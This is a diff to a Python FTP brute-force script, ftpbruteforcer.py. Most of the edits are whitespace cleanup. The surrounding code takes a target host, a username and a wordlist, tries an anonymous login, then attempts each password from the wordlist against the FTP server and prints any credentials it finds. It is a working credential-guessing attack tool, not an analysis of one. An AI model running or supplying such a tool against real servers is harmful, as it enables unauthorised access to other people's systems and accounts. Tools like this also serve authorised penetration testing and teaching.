@@ -16,8 +16,7 @@ def connect(host,user,password):
 def main():
     
     #Parser Call
-    parser = argparse.ArgumentParser("python ftpbruteforcer.py")
-    
+    parser = argparse.ArgumentParser("python ftpbruteforcer.py") 
     parser.add_argument("-t" ,"--target", dest="targetHostAddress", type=str, help="The address of the host", required=True)
     parser.add_argument("-u" ,"--username", dest="userName", type=str, help="The username of the host", required=True)
     parser.add_argument("-w" ,"--worldlist", dest="Password", type=str, help="The path of the wordlist", required=True)
@@ -46,6 +45,7 @@ def main():
         print (colored("[*] FTP Anonymous log on succeed on host ",'green') + targetHostAddress)
     else:
         print (colored("[*] FTP Anonymous log on failed on host " + targetHostAddress,'red'))
+        
         #Brute force with dictionary
         #Open dictionary
         passwordsFile = open(passwordsFieldPath, 'r')
@@ -53,15 +53,10 @@ def main():
         for line in passwordsFile.readlines():
             #Clean the lines in the dictionary file
             password = line.strip('\r').strip('\n')
-            
-            
             print (colored("[Testing] ... ",'yellow') + str(password))
-        
-            
             
             if connect(targetHostAddress,userName,password):
                 #Found password
-                
                 print ("")
                 print (colored(">>>> FTP Logon succeeded on host " + targetHostAddress + " <<<<",'light_green'))
                 print (colored("[*] The username is : ",'light_green') + userName)
@@ -70,10 +65,10 @@ def main():
                 exit(0)
             else:
                 #Not found password
-                
                 print (colored("[*] FTP Logon failed on host " + targetHostAddress,'red'))
     print ("")            
     print (colored(">>>> PASSWORD NOT FOUND! <<<<",'light_red'))
+    
 #Call main
 if __name__ =="__main__":
         main()
